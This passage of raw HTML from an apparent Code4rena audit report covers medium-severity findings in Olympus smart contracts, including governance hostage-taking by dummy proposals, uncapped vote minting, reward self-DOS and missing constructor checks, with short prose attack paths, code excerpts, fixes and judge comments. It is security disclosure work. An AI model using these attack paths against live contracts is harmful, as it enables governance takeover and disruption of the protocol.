3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325\">https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325</a></p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Adding <code>require(activePolicies[idx] == policy_, \"Unregistered policy\");</code> will prevent this, where <code>idx = getPolicyIndex[policy_]</code>.</p>\n<p><strong>NOTE:</strong> The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1241160679\">ind-igo (Olympus) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Confirmed. Should be lower risk or a QA issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1251627251\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@ind-igo - can you comment on why you think it should be QA vs Medium?</p>\n<p><code>— Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n<p>I would expect this to impact the functionality of the protocol. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255251454\">Oighty (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>This one seems on the fence to me. While accidentally unregistering a policy likely would affect the functionality of the protocol, it requires the executor to make a mistake. If the mistake is made, it’s easily remedied by re-registering the policy.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255293207\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>That makes sense, but there would be some amount of down time when this occurred. I think Medium is correct for this issue. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-14-the-governance-system-can-be-held-hostage-by-a-malicious-user\" style=\"position:relative;\"><a href=\"#m-14-the-governance-system-can-be-held-hostage-by-a-malicious-user\" aria-label=\"m 14 the governance system can be held hostage by a malicious user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/375\">[M-14] The governance system can be held hostage by a malicious user</a></h2>\n<p><em>Submitted by d3e4, also found by Aymen0909 and pedroais</em></p>\n<p>With only <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L130\"><code>ENDORSEMENT_THRESHOLD</code></a>% (currently 20%) voting power, a malicious user can prevent any other proposal from being activated.\nWhile <code>ENDORSEMENT_THRESHOLD</code> is currently fairly high, it seems not higher than that it might not be used to hold the system hostage to extract far more funds.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159\">Submit</a> a dummy proposal, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L180\">endorse</a> it and then <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205\">activate</a> it. Now, no other proposal can be activated for a <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L127\"><code>GRACE_PERIOD</code></a>. When this time period is over, this procedure may be repeated, either immediately or just before any other proposal activation by front-running.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Making sure <code>ENDORSEMENT_THRESHOLD</code> is at least 50% seems discouraging enough. Other more creative solutions should be possible. One might be to let the most endorsed proposal be activated, or restricting who can activate a proposal; anything that at least temporarily liberates the governance system so that the attacker is dissuaded from investing in this attack method.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/375\">fullyallocated (Olympus) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-15-heart-will-stop-if-all-rewards-are-swept\" style=\"position:relative;\"><a href=\"#m-15-heart-will-stop-if-all-rewards-are-swept\" aria-label=\"m 15 heart will stop if all rewards are swept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/378\">[M-15] Heart will stop if all rewards are swept</a></h2>\n<p><em>Submitted by GalloDaSballo, also found by cccz, itsmeSTYJ, and PwnPatrol</em></p>\n<p>Rewards for Heart <code>beat</code> are sent via <code>_issueReward</code></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_issueReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardIssued</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The function doesn’t check for available tokens e.g.<br>\n<code>min(reward, rewardToken.balanceOf(address(this)));</code></p>\n<p>In case of calling <code>withdrawUnspentRewards</code></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @inheritdoc IHeart</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawUnspentRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;heart_admin&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Because the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.</p>\n<p>While a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates <code>rewardToken</code> or the DAO deals with the lack of tokens.</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a check for available tokens\n<code>min(reward, rewardToken.balanceOf(address(this)));</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/378#issuecomment-1239855093\">Oighty (Olympus) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Agree based on the anti-DOS characteristics of using a min operation.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-16-inconsistant-parameter-requirements-between-constructor-and-set-functions-in-rangesol-and-operatorsol\" style=\"position:relative;\"><a href=\"#m-16-inconsistant-parameter-requirements-between-constructor-and-set-functions-in-rangesol-and-operatorsol\" aria-label=\"m 16 inconsistant parameter requirements between constructor and set functions in rangesol and operatorsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/379\">[M-16] Inconsistant parameter requirements between <code>constructor()</code> and <code>Set() functions</code> in <code>RANGE.sol</code> and <code>Operator.sol</code>.</a></h2>\n<p><em>Submitted by hansfriese, also found by datapunk and itsmeSTYJ</em></p>\n<p>Inconsistant parameter requirements between <code>constructor</code> and <code>Set() functions</code> in <code>RANGE.sol</code> and <code>Operator.sol</code>.</p>\n<p>The contracts might work unexpectedly when the params are set improperly using <code>constructor()</code>.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>In <code>RANGE.sol</code>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250\">setSpreads()</a> and <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264\">setThresholdFactor()</a> has some requirements but <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80\">constructor()</a> doesn’t check at all.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    File: 2022-08-olympus\\src\\modules\\RANGE.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    242:     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    243:         // Confirm spreads are within allowed values</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    244:         if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    245:             wallSpread_ &gt; 10000 ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    246:             wallSpread_ &lt; 100 ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    247:             cushionSpread_ &gt; 10000 ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    248:             cushionSpread_ &lt; 100 ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    249:             cushionSpread_ &gt; wallSpread_</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    250:         ) revert RANGE_InvalidParams();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    251: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    252:         // Set spreads</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    253:         _range.wall.spread = wallSpread_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    254:         _range.cushion.spread = cushionSpread_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    255: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    256:         emit SpreadsChanged(wallSpread_, cushionSpread_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    257:     }</span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    File: 2022-08-olympus\\src\\modules\\RANGE.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    263:     function setThresholdFactor(uint256 thresholdFactor_) external permissioned {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    264:         if (thresholdFactor_ &gt; 10000 || thresholdFactor_ &lt; 100) revert RANGE_InvalidParams();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    265:         thresholdFactor = thresholdFactor_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    266: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    267:         emit ThresholdFactorChanged(thresholdFactor_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    268:     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    269: </span></span></code></pre>\n<ul>\n<li>In <code>Operator.sol</code>, <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L518\">setCushionFactor()</a> checks the requirement but <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L134\">constructor()</a> doesn’t check it.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    File: 2022-08-olympus\\src\\policies\\Operator.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    516:     function setCushionFactor(uint32 cushionFactor_) external onlyRole(&quot;operator_policy&quot;) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    517:         /// Confirm factor is within allowed values</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    518:         if (cushionFactor_ &gt; 10000 || cushionFactor_ &lt; 100) revert Operator_InvalidParams();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    519: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    520:         /// Set factor</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    521:         _config.cushionFactor = cushionFactor_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    522: </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    523:         emit CushionFactorChanged(cushionFactor_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    524:     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    525: </span></span></code></pre>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Solidity Visual Developer of VSCode</p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Recommend adding same validation for the parameters between <code>constructor()</code> and <code>Set()</code> functions.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1238786025\">Oighty (Olympus) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Agree that the constructor should validate these parameters, but it is only an issue if configured improperly. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1251087775\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While I am typically weary of marking input validations as medium severity, I do think in this case it’s warranted as it directly leads to malfunctions at the protocol level and it seems that the sponsors thought it important enough to add the checks elsewhere. Hard call, but will award it at medium severity.   </p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-no-cap-on-amount-of-votes-means-the-voter_admin-can-get-any-proposal-to-pass\" style=\"position:relative;\"><a href=\"#m-17-no-cap-on-amount-of-votes-means-the-voter_admin-can-get-any-proposal-to-pass\" aria-label=\"m 17 no cap on amount of votes means the voter_admin can get any proposal to pass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/380\">[M-17] No Cap on Amount of VOTES means the <code>voter_admin</code> can get any proposal to pass</a></h2>\n<p><em>Submitted by GalloDaSballo, also found by 0xNazgul, IllIllI, and rbserver</em></p>\n<p>Because <code>VOTES</code> can be minted by <code>voter_admin</code>, and there is no cap on totalSupply, the <code>voter_admin</code> has the privileged ability to mint as many <code>VOTES</code> as they want in order to get any proposal to pass or veto it.</p>\n<h3 id=\"proof-of-concept---veto\" style=\"position:relative;\"><a href=\"#proof-of-concept---veto\" aria-label=\"proof of concept   veto permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept - Veto</h3>\n<ul>\n<li>Be <code>voter_admin</code></li>\n<li>Mint XYZ tokens</li>\n<li>totalSupply is now higher so any proposal can be <a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268-L269\">vetoed per this line</a></li>\n</ul>\n<h3 id=\"proof-of-concept---approve\" style=\"position:relative;\"><a href=\"#proof-of-concept---approve\" aria-label=\"proof of concept   approve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept - Approve</h3>\n<ul>\n<li>Be <code>voter_admin</code></li>\n<li>Mint XYZ tokens, where XYZ allows the <code>netVotes * 100 &#x3C; VOTES.totalSupply() * EXECUTION_THRESHOLD</code> check to pass</li>\n<li>Mint <code>VOTES</code> to self</li>\n<li>Vote</li>\n<li>Proposal has passed</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a total supply cap to <code>VOTES</code>.</p>\n<p><strong><a 